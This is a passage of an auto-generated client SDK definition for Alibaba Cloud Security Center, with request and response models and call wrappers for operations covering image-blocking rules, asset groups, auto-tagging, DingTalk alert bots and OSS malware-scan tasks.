>  You can call the [GetSensitiveDefineRuleConfig](~~GetSensitiveDefineRuleConfig~~) operation to query the ID of the malicious sample.', example='key'),
          name?: string(name='Name', description='The name of the sensitive files.

>  You can call the [GetSensitiveDefineRuleConfig](~~GetSensitiveDefineRuleConfig~~) operation to query the ID of the malicious sample.', example='name'),
        }
      ](name='Item', description='The configuration of sensitive file.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='SensitiveFile', description='The configuration of sensitive file.'),
    vul?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the vulnerability.

>  You can call the [DescribeVulListPage](https://help.aliyun.com/document_detail/471928.html) operation to query the ID.', example='CVE-2023-36034'),
          name?: string(name='Name', description='The name of the vulnerability.

>  You can call the [DescribeVulListPage](https://help.aliyun.com/document_detail/471928.html) operation to query the name.', example='Microsoft Edge vul'),
        }
      ](name='Item', description='The vulnerabilities.'),
      riskClass?: [ 
        {
          id?: string(name='Id', description='The ID of the vulnerability types. Valid values:

*   **cve**: system vulnerability
*   **app**: application vulnerability', example='cve'),
          name?: string(name='Name', description='The name of the vulnerability. Valid values:

*   **system vulnerability**
*   **application vulnerability**', example='system vulnerability'),
        }
      ](name='RiskClass', description='Risk type of vulnerability.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='Vul', description='The vulnerability risks.'),
  }(name='AlarmDetail', description='The risks that you want to detect by using the rule.'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

> This parameter is deprecated.', example='cfa7e2fb8c221483ba59e098c34c6****'),
  clusterName?: string(name='ClusterName', description='The cluster name.

> This parameter is deprecated.', example='*'),
  description?: string(name='Description', description='The rule description.', example='default policy'),
  imageName?: [ string ](name='ImageName', description='The image names.'),
  label?: [ string ](name='Label', description='The container tags.'),
  maliciousImage?: boolean(name='MaliciousImage', description='Specifies whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='true'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: trigger alerts
*   **2**: block
*   **3**: allow', example='1'),
  scopes?: [ 
    {
      ackPolicyInstanceId?: string(name='AckPolicyInstanceId', description='The ID of the cluster node to which the rule is applied.

> This parameter is not required when you create the instance.', example='ack-p-1'),
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **1**: includes all namespaces.
*   **0**: does not include all namespaces.', example='1'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster that is specified in the rule.

>  You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/421736.html) operation to query the cluster ID.', example='cc50d***015d2'),
      namespaceList?: [ string ](name='NamespaceList', description='The namespaces.

> This parameter is valid only when the AllNamespace parameter is set to 0.'),
    }
  ](name='Scopes', description='The application scope of the rule.'),
  strategyId?: long(name='StrategyId', description='The rule ID.

>  You can call the [ListOpaClusterStrategyNew](https://help.aliyun.com/document_detail/2623574.html) operation to query the rule ID.

> This parameter is invalid when you create a rule.', example='16'),
  strategyName?: string(name='StrategyName', description='The rule name.', example='default'),
  strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the rule template.

>  You can call the [GetOpaStrategyTemplateSummary](https://help.aliyun.com/document_detail/2539952.html) operation to query the ID of the rule template.', example='109'),
  unScanedImage?: boolean(name='UnScanedImage', description='Specifies whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='true'),
  whiteList?: [ string ](name='WhiteList', description='The whitelist.'),
}

model CreateOpaStrategyNewShrinkRequest {
  alarmDetailShrink?: string(name='AlarmDetail', description='The risks that you want to detect by using the rule.'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

> This parameter is deprecated.', example='cfa7e2fb8c221483ba59e098c34c6****'),
  clusterName?: string(name='ClusterName', description='The cluster name.

> This parameter is deprecated.', example='*'),
  description?: string(name='Description', description='The rule description.', example='default policy'),
  imageName?: [ string ](name='ImageName', description='The image names.'),
  label?: [ string ](name='Label', description='The container tags.'),
  maliciousImage?: boolean(name='MaliciousImage', description='Specifies whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='true'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: trigger alerts
*   **2**: block
*   **3**: allow', example='1'),
  scopes?: [ 
    {
      ackPolicyInstanceId?: string(name='AckPolicyInstanceId', description='The ID of the cluster node to which the rule is applied.

> This parameter is not required when you create the instance.', example='ack-p-1'),
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **1**: includes all namespaces.
*   **0**: does not include all namespaces.', example='1'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster that is specified in the rule.

>  You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/421736.html) operation to query the cluster ID.', example='cc50d***015d2'),
      namespaceList?: [ string ](name='NamespaceList', description='The namespaces.

> This parameter is valid only when the AllNamespace parameter is set to 0.'),
    }
  ](name='Scopes', description='The application scope of the rule.'),
  strategyId?: long(name='StrategyId', description='The rule ID.

>  You can call the [ListOpaClusterStrategyNew](https://help.aliyun.com/document_detail/2623574.html) operation to query the rule ID.

> This parameter is invalid when you create a rule.', example='16'),
  strategyName?: string(name='StrategyName', description='The rule name.', example='default'),
  strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the rule template.

>  You can call the [GetOpaStrategyTemplateSummary](https://help.aliyun.com/document_detail/2539952.html) operation to query the ID of the rule template.', example='109'),
  unScanedImage?: boolean(name='UnScanedImage', description='Specifies whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='true'),
  whiteList?: [ string ](name='WhiteList', description='The whitelist.'),
}

model CreateOpaStrategyNewResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ string ](name='Data', description='The IDs of the clusters that failed to be saved.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='success'),
  requestId?: string(name='RequestId', description='The request ID.', example='CD380235-A0B8-540D-A0D5-D62884469E3C'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model CreateOpaStrategyNewResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOpaStrategyNewResponseBody(name='body'),
}

/**
 * @summary Creates a rule to block at-risk images.
 *
 * @param tmpReq CreateOpaStrategyNewRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOpaStrategyNewResponse
 */
async function createOpaStrategyNewWithOptions(tmpReq: CreateOpaStrategyNewRequest, runtime: Util.RuntimeOptions): CreateOpaStrategyNewResponse {
  Util.validateModel(tmpReq);
  var request = new CreateOpaStrategyNewShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.alarmDetail)) {
    request.alarmDetailShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.alarmDetail, 'AlarmDetail', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.alarmDetailShrink)) {
    query['AlarmDetail'] = request.alarmDetailShrink;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.description)) {
    query['Description'] = request.description;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.label)) {
    query['Label'] = request.label;
  }
  if (!Util.isUnset(request.maliciousImage)) {
    query['MaliciousImage'] = request.maliciousImage;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.scopes)) {
    query['Scopes'] = request.scopes;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  if (!Util.isUnset(request.strategyTemplateId)) {
    query['StrategyTemplateId'] = request.strategyTemplateId;
  }
  if (!Util.isUnset(request.unScanedImage)) {
    query['UnScanedImage'] = request.unScanedImage;
  }
  if (!Util.isUnset(request.whiteList)) {
    query['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOpaStrategyNew',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a rule to block at-risk images.
 *
 * @param request CreateOpaStrategyNewRequest
 * @return CreateOpaStrategyNewResponse
 */
async function createOpaStrategyNew(request: CreateOpaStrategyNewRequest): CreateOpaStrategyNewResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOpaStrategyNewWithOptions(request, runtime);
}

model CreateOrUpdateAssetGroupRequest {
  groupId?: long(name='GroupId', description='The ID of the server group for which you want to add to or remove servers.

>  To modify the mapping between an asset and an asset group, you must provide the ID of the asset group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) to query the IDs of asset groups. If you do not configure this parameter when you call this operation, an asset group is created.', example='55426'),
  groupName?: string(name='GroupName', description='The name of the server group that you want to create or the server group for which you want to add or remove a server.

>  To modify the mapping between a server and a server group, you must provide the name of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the names of server groups. If you do not configure GroupID when you call this operation, a server group is created. In this case, you must configure GroupName.', example='test'),
  uuids?: string(name='Uuids', description='The UUID of the server in the server group that you want to create or the server group for which you want to add or remove servers. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='aq12-***,s23***'),
}

model CreateOrUpdateAssetGroupResponseBody = {
  groupId?: long(name='GroupId', description='The ID of the server group.', example='9935302'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
}

model CreateOrUpdateAssetGroupResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOrUpdateAssetGroupResponseBody(name='body'),
}

/**
 * @summary Modifies the mapping between an asset and an asset group. For example, you can call this operation to modify the server group to which the asset belongs or the asset list of the asset group.
 *
 * @description A server can belong only to one server group. If you call the CreateOrUpdateAssetGroup operation and the server specified in request parameters belongs to Server Group A, the server is removed from Server Group A and then added to the newly created or specified server group after the call is complete.
 *
 * @param request CreateOrUpdateAssetGroupRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOrUpdateAssetGroupResponse
 */
async function createOrUpdateAssetGroupWithOptions(request: CreateOrUpdateAssetGroupRequest, runtime: Util.RuntimeOptions): CreateOrUpdateAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOrUpdateAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the mapping between an asset and an asset group. For example, you can call this operation to modify the server group to which the asset belongs or the asset list of the asset group.
 *
 * @description A server can belong only to one server group. If you call the CreateOrUpdateAssetGroup operation and the server specified in request parameters belongs to Server Group A, the server is removed from Server Group A and then added to the newly created or specified server group after the call is complete.
 *
 * @param request CreateOrUpdateAssetGroupRequest
 * @return CreateOrUpdateAssetGroupResponse
 */
async function createOrUpdateAssetGroup(request: CreateOrUpdateAssetGroupRequest): CreateOrUpdateAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOrUpdateAssetGroupWithOptions(request, runtime);
}

model CreateOrUpdateAutoTagRuleRequest {
  checkAll?: boolean(name='CheckAll', description='Specifies whether to check the rule on the backend. Valid values:

*   **true**
*   **false**', example='false'),
  expression?: string(name='Expression', description='The expression of the rule.', example='[{"groups":"0","fieldValueType":"string","field":"internetIp","operator":"equals","value":"12.0.0.1"}]'),
  ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='describe'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the [ListAutoTagRules](~~ListAutoTagRules~~) operation to query the ID.', example='300566'),
  ruleName?: string(name='RuleName', description='The name of the rule.

This parameter is required.', example='text-001'),
  tagContext?: string(name='TagContext', description='The tag specified by the operation type of the rule.

*   If TagType is set to group, set this parameter to {"groupId":XXX}. XXX specifies the ID of the group. You can call the [DescribeGroupStruct](~~DescribeGroupStruct~~) operation to query the ID.
*   If TagType is set to tag, set this parameter to {"tagId":XXX}. XXX specifies the ID of the tag. You can call the [DescribeGroupedTags](~~DescribeGroupedTags~~) operation to query the ID.', example='{"tagId":7804789}'),
  tagType?: string(name='TagType', description='The operation type of the rule. Valid values:

*   **group**
*   **tag**

This parameter is required.', example='tag'),
}

model CreateOrUpdateAutoTagRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='33DCC98C-824D-55D6-8DC5-47F3A71AD867'),
}

model CreateOrUpdateAutoTagRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOrUpdateAutoTagRuleResponseBody(name='body'),
}

/**
 * @summary Creates an asset auto-tagging rule or modifies an asset auto-tagging rule that is created on the Asset Management Rule tab.
 *
 * @param request CreateOrUpdateAutoTagRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOrUpdateAutoTagRuleResponse
 */
async function createOrUpdateAutoTagRuleWithOptions(request: CreateOrUpdateAutoTagRuleRequest, runtime: Util.RuntimeOptions): CreateOrUpdateAutoTagRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkAll)) {
    query['CheckAll'] = request.checkAll;
  }
  if (!Util.isUnset(request.expression)) {
    query['Expression'] = request.expression;
  }
  if (!Util.isUnset(request.ruleDesc)) {
    query['RuleDesc'] = request.ruleDesc;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.tagContext)) {
    query['TagContext'] = request.tagContext;
  }
  if (!Util.isUnset(request.tagType)) {
    query['TagType'] = request.tagType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOrUpdateAutoTagRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an asset auto-tagging rule or modifies an asset auto-tagging rule that is created on the Asset Management Rule tab.
 *
 * @param request CreateOrUpdateAutoTagRuleRequest
 * @return CreateOrUpdateAutoTagRuleResponse
 */
async function createOrUpdateAutoTagRule(request: CreateOrUpdateAutoTagRuleRequest): CreateOrUpdateAutoTagRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOrUpdateAutoTagRuleWithOptions(request, runtime);
}

model CreateOrUpdateDingTalkRequest {
  configList?: string(name='ConfigList', description='The alerts for which you want the chatbot to send notifications. The value is a JSON array that contains the following fields:

*   **type**: the types of alerts. The valid values are listed in the "Additional description of parameters" section in this topic.

*   **configItemList**: the list of check items. The value is a JSON array that contains the following fields:

    *   **key**: the key of the check item.
    *   **valueList**: the values of the check item. The value of valueList is a JSON array.

> For more information about the value of this parameter, see the "Addition description of parameters" section in this topic.', example='[{"type":"sas_analysis_online-sas-operation-log-sas-event-suspicious","configItemList":[{"key":"item_level","valueList":["all"]},{"key":"event_type","valueList":["all"]}]}]'),
  dingTalkLang?: string(name='DingTalkLang', description='The language of the notifications. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  groupIdList?: string(name='GroupIdList', description='The IDs of asset groups for which you want the chatbot to send notifications. The value is a JSON array.

> You can call the [DescribeGroupStruct](~~DescribeGroupStruct~~) operation to query the IDs of asset groups.', example='["10417151"]'),
  id?: long(name='Id', description='The ID of the chatbot.

> You can call the [DescribeDingTalk](https://www.alibabacloud.com/help/en/security-center/developer-reference/api-sas-2018-12-03-describedingtalk/?spm=a2c63.p38356.0.0.681e4360Qd1eb1) operation to query the IDs of chatbots.', example='1589'),
  intervalTime?: long(name='IntervalTime', description='The time interval at which the chatbot sends notifications.

> The value **0** indicates unlimited.', example='0'),
  ruleActionName?: string(name='RuleActionName', description='The name of the chatbot.

> The name of a chatbot must be 2 to 64 characters in length.

This parameter is required.', example='testNotify'),
  sendUrl?: string(name='SendUrl', description='The webhook URL.

This parameter is required.', example='https://oapi.dingtalk.com/robot/send?access_token=XXX'),
}

model CreateOrUpdateDingTalkResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='76975B7A-34DC-5CB6-9538-91700D4F112E'),
}

model CreateOrUpdateDingTalkResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOrUpdateDingTalkResponseBody(name='body'),
}

/**
 * @summary Creates or modifies a DingTalk chatbot that sends notifications.
 *
 * @param request CreateOrUpdateDingTalkRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOrUpdateDingTalkResponse
 */
async function createOrUpdateDingTalkWithOptions(request: CreateOrUpdateDingTalkRequest, runtime: Util.RuntimeOptions): CreateOrUpdateDingTalkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configList)) {
    query['ConfigList'] = request.configList;
  }
  if (!Util.isUnset(request.dingTalkLang)) {
    query['DingTalkLang'] = request.dingTalkLang;
  }
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.intervalTime)) {
    query['IntervalTime'] = request.intervalTime;
  }
  if (!Util.isUnset(request.ruleActionName)) {
    query['RuleActionName'] = request.ruleActionName;
  }
  if (!Util.isUnset(request.sendUrl)) {
    query['SendUrl'] = request.sendUrl;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOrUpdateDingTalk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates or modifies a DingTalk chatbot that sends notifications.
 *
 * @param request CreateOrUpdateDingTalkRequest
 * @return CreateOrUpdateDingTalkResponse
 */
async function createOrUpdateDingTalk(request: CreateOrUpdateDingTalkRequest): CreateOrUpdateDingTalkResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOrUpdateDingTalkWithOptions(request, runtime);
}

model CreateOssBucketScanTaskRequest {
  allKeyPrefix?: boolean(name='AllKeyPrefix', description='Specifies whether to match the prefixes of all objects.', example='true'),
  bucketNameList?: [ string ](name='BucketNameList', description='The names of the buckets.

This parameter is required.'),
  decompressMaxFileCount?: int32(name='DecompressMaxFileCount', description='The maximum number of objects that can be extracted during decompression. Valid values: 1 to 1000. If the maximum number of objects that can be extracted is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='100'),
  decompressMaxLayer?: int32(name='DecompressMaxLayer', description='The maximum number of decompression levels when multi-level packages are decompressed. Valid values: 1 to 5. If the maximum number of decompression levels is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='1'),
  decryptionList?: [ string ](name='DecryptionList', description='The decryption methods.'),
  excludeKeySuffixList?: [ string ](name='ExcludeKeySuffixList', description='The suffixes of the objects that you do not want to check.'),
  keyPrefixList?: [ string ](name='KeyPrefixList', description='The prefixes of the objects.'),
  keySuffixList?: [ string ](name='KeySuffixList', description='The suffixes of the objects that you want to check.'),
  lastModifiedStartTime?: long(name='LastModifiedStartTime', description='The timestamp when the object was last modified. The time must be later than the timestamp that you specify. Unit: milliseconds.', example='1724301769834'),
  scanMode?: int32(name='ScanMode', description='The check mode. Valid values:

*   **1**: checks all objects in the bucket.
*   **2**: checks only new objects in the bucket.

This parameter is required.', example='1'),
}

model CreateOssBucketScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='BBD75EC2-2F4F-5A7B-AA53-18724DC8****'),
}

model CreateOssBucketScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOssBucketScanTaskResponseBody(name='body'),
}

/**
 * @summary Creates a bucket check task.
 *
 * @param request CreateOssBucketScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOssBucketScanTaskResponse
 */
async function createOssBucketScanTaskWithOptions(request: CreateOssBucketScanTaskRequest, runtime: Util.RuntimeOptions): CreateOssBucketScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allKeyPrefix)) {
    query['AllKeyPrefix'] = request.allKeyPrefix;
  }
  if (!Util.isUnset(request.bucketNameList)) {
    query['BucketNameList'] = request.bucketNameList;
  }
  if (!Util.isUnset(request.decompressMaxFileCount)) {
    query['DecompressMaxFileCount'] = request.decompressMaxFileCount;
  }
  if (!Util.isUnset(request.decompressMaxLayer)) {
    query['DecompressMaxLayer'] = request.decompressMaxLayer;
  }
  if (!Util.isUnset(request.decryptionList)) {
    query['DecryptionList'] = request.decryptionList;
  }
  if (!Util.isUnset(request.excludeKeySuffixList)) {
    query['ExcludeKeySuffixList'] = request.excludeKeySuffixList;
  }
  if (!Util.isUnset(request.keyPrefixList)) {
    query['KeyPrefixList'] = request.keyPrefixList;
  }
  if (!Util.isUnset(request.keySuffixList)) {
    query['KeySuffixList'] = request.keySuffixList;
  }
  if (!Util.isUnset(request.lastModifiedStartTime)) {
    query['LastModifiedStartTime'] = request.lastModifiedStartTime;
  }
  if (!Util.isUnset(request.scanMode)) {
    query['ScanMode'] = request.scanMode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOssBucketScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a bucket check task.
 *
 * @param request CreateOssBucketScanTaskRequest
 * @return CreateOssBucketScanTaskResponse
 */
async function createOssBucketScanTask(request: CreateOssBucketScanTaskRequest): CreateOssBucketScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOssBucketScanTaskWithOptions(request, runtime);
}

model CreateOssScanConfigRequest {
  allKeyPrefix?: boolean(name='AllKeyPrefix', description='Specifies whether to match the prefixes of all objects.', example='true'),
  bucketNameList?: [ string ](name='BucketNameList', description='The names of buckets.'),
  decompressMaxFileCount?: int32(name='DecompressMaxFileCount', description='The maximum number of objects that can be extracted during decompression. Valid values: 1 to 1000. If the maximum number of objects that can be extracted is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='100'),
  decompressMaxLayer?: int32(name='DecompressMaxLayer', description='The maximum number of decompression levels when multi-level packages are decompressed. Valid values: 1 to 5. If the maximum number of decompression levels is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='1'),
  decryptionList?: [ string ](name='DecryptionList', description='The decryption methods.'),
  enable?: int32(name='Enable', description='Specifies whether to enable the policy. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
  endTime?: string(name='EndTime', description='The time when the scan ends. The time must be in the HH:mm:ss format.', example='01:01:00'),
  keyPrefixList?: [ string ](name='KeyPrefixList', description='The prefixes of the objects.'),
  keySuffixList?: [ string ](name='KeySuffixList', description='The suffixes of the files to scan.'),
  lastModifiedStartTime?: long(name='LastModifiedStartTime', description='The timestamp when the object was last modified. The time must be later than the timestamp that you specify. Unit: milliseconds.', example='1724301769834'),
  name?: string(name='Name', description='The policy name.', example='runtime'),
  scanDayList?: [ int32 ](name='ScanDayList', description='The days on which the scan is executed in a week.'),
  startTime?: string(name='StartTime', description='The time when the scan starts. The time must be in the HH:mm:ss format.', example='00:00:00'),
}

model CreateOssScanConfigResponseBody = {
  id?: long(name='Id', description='The policy ID.', example='210****'),
  requestId?: string(name='RequestId', description='The request ID.', example='5DFD6277-CC36-57F7-ACE6-F5952123****'),
}

model CreateOssScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOssScanConfigResponseBody(name='body'),
}

/**
 * @summary Creates a policy for detecting malicious Object Storage Service (OSS) objects by using the SDK for malicious file detection feature.
 *
 * @param request CreateOssScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOssScanConfigResponse
 */
async function createOssScanConfigWithOptions(request: CreateOssScanConfigRequest, runtime: Util.RuntimeOptions): CreateOssScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allKeyPrefix)) {
    query['AllKeyPrefix'] = request.allKeyPrefix;
  }
  if (!Util.isUnset(request.bucketNameList)) {
    query['BucketNameList'] = request.bucketNameList;
  }
  if (!Util.isUnset(request.decompressMaxFileCount)) {
    query['DecompressMaxFileCount'] = request.decompressMaxFileCount;
  }
  if (!Util.isUnset(request.decompressMaxLayer)) {
    query['DecompressMaxLayer'] = request.decompressMaxLayer;
  }
  if (!Util.isUnset(request.decryptionList)) {
    query['DecryptionList'] = request.decryptionList;
  }
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.keyPrefixList)) {
    query['KeyPrefixList'] = request.keyPrefixList;
  }
  if (!Util.isUnset(request.keySuffixList)) {
    query['KeySuffixList'] = request.keySuffixList;
  }
  if (!Util.isUnset(request.lastModifiedStartTime)) {
    query['LastModifiedStartTime'] = request.lastModifiedStartTime;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.scanDayList)) {
    query['ScanDayList'] = request.scanDayList;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOssScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a policy for detecting malicious Object Storage Service (OSS) objects by using the SDK for malicious file detection feature.
 *
 * @param request CreateOssScanConfigRequest
 * @return CreateOssScanConfigResponse
 */
async function createOssScanConfig(request: CreateOssScanConfigRequest): CreateOssScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOssScanConfigWithOptions(request, runtime);
}

model CreateRdDefaultSyncListRequest {
  folderIds?: string(name='FolderIds', description='The IDs of the folders in the resource directory.

>  You can call the [GetRdTree](~~GetRdTree~~) operation to obtain the IDs of the folders. Separate multiple folder IDs with commas (,). If you do not specify a value for this parameter, the existing member list is cleared.', example='fd-BwoXuf****,fd-CFamY7****'),
}

model CreateRdDefaultSyncListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BA674E4B-00CF-5DEA-8B92-360862FB5133'),
}

model CreateRdDefaultSyncListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateRdDefaultSyncListResponseBody(name='body'),
}

/**
 * @summary Creates an automatic account management policy for members of the account monitored by Security Center type by using the multi-account management feature. After the policy is created, the members that are newly added to the specified resource directory are automatically added to the list of members of the account monitored by Security Center type.
 *
 * @description You can call this operation only by using the management account of a resource directory or a delegated administrator account of Security Center.
 *
 * @param request CreateRdDefaultSyncListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateRdDefaultSyncListResponse
 */
async function createRdDefaultSyncListWithOptions(request: CreateRdDefaultSyncListRequest, runtime: Util.RuntimeOptions): CreateRdDefaultSyncListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.folderIds)) {
    query['FolderIds'] = request.folderIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
